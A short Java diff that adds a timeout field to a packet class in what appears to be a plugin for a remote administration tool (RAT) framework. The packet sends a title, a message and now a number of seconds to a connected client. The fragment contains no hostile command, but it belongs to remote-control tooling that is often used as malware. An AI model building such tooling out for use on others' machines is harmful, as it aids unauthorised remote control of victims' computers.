@@ -10,17 +10,20 @@ public class AskPacket extends PacketBuilder {
 
 	private String title;
 	private String message;
+	private int seconds;
 
-	public AskPacket(RATObject rat, String title, String message) {
+	public AskPacket(RATObject rat, String title, String message, int i) {
 		super(ExampleClientPlugin.HEADER, rat);
 		this.title = title;
 		this.message = message;
+		this.seconds = i;
 	}
 
 	@Override
 	public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
 		dos.writeUTF(this.title);
 		dos.writeUTF(this.message);
+		dos.writeInt(seconds);
 	}
 
 }
